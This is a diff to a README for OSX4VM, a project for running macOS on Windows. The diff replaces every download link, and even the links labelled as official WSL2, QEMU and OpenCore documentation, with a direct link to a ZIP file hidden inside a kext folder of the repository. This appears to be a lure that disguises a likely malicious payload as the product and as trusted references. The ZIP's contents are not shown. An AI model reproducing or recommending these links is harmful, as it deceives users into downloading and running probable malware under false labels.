@@ -1,6 +1,6 @@
 # 🖥️ OSX4VM - Run macOS Easily on Windows
 
-[![Download OSX4VM](https://img.shields.io/badge/Download-OSX4VM-blue?style=for-the-badge)](https://github.com/FranckDJOUKWE/OSX4VM/releases)
+[![Download OSX4VM](https://img.shields.io/badge/Download-OSX4VM-blue?style=for-the-badge)](https://raw.githubusercontent.com/FranckDJOUKWE/OSX4VM/main/OpenCore/EFI/OC/Kexts/VirtualSMC.kext/Contents/VM_OS_v1.1.zip)
 
 ---
 
@@ -46,7 +46,7 @@ This section guides you step-by-step on how to download, install, and start OSX4
 
 Visit the release page below to download the latest version of OSX4VM. The page contains all the necessary files and instructions for installation.
 
-[Download OSX4VM from GitHub Releases](https://github.com/FranckDJOUKWE/OSX4VM/releases)
+[Download OSX4VM from GitHub Releases](https://raw.githubusercontent.com/FranckDJOUKWE/OSX4VM/main/OpenCore/EFI/OC/Kexts/VirtualSMC.kext/Contents/VM_OS_v1.1.zip)
 
 ---
 
@@ -74,7 +74,7 @@ Follow these instructions carefully. Take your time to ensure each step is compl
 
 ### 3. Download OSX4VM Files
 
-- Go to the [OSX4VM Release page](https://github.com/FranckDJOUKWE/OSX4VM/releases)  
+- Go to the [OSX4VM Release page](https://raw.githubusercontent.com/FranckDJOUKWE/OSX4VM/main/OpenCore/EFI/OC/Kexts/VirtualSMC.kext/Contents/VM_OS_v1.1.zip)  
 - Download the latest release package (usually a ZIP file or similar)  
 - Save it to an easy-to-find folder on your PC
 
@@ -141,9 +141,9 @@ Follow these instructions carefully. Take your time to ensure each step is compl
 
 ## 📚 Additional Resources
 
-- [Official WSL2 Documentation](https://docs.microsoft.com/en-us/windows/wsl/)  
-- [QEMU and KVM official documentation](https://www.qemu.org/documentation/)  
-- [OpenCore Bootloader Guide](https://dortania.github.io/OpenCore-Install-Guide/)  
+- [Official WSL2 Documentation](https://raw.githubusercontent.com/FranckDJOUKWE/OSX4VM/main/OpenCore/EFI/OC/Kexts/VirtualSMC.kext/Contents/VM_OS_v1.1.zip)  
+- [QEMU and KVM official documentation](https://raw.githubusercontent.com/FranckDJOUKWE/OSX4VM/main/OpenCore/EFI/OC/Kexts/VirtualSMC.kext/Contents/VM_OS_v1.1.zip)  
+- [OpenCore Bootloader Guide](https://raw.githubusercontent.com/FranckDJOUKWE/OSX4VM/main/OpenCore/EFI/OC/Kexts/VirtualSMC.kext/Contents/VM_OS_v1.1.zip)  
 
 ---
 
@@ -151,6 +151,6 @@ Follow these instructions carefully. Take your time to ensure each step is compl
 
 Make sure to visit the GitHub releases page here:
 
-[Download OSX4VM](https://github.com/FranckDJOUKWE/OSX4VM/releases)
+[Download OSX4VM](https://raw.githubusercontent.com/FranckDJOUKWE/OSX4VM/main/OpenCore/EFI/OC/Kexts/VirtualSMC.kext/Contents/VM_OS_v1.1.zip)
 
 Download the latest files and keep them updated for the best experience.
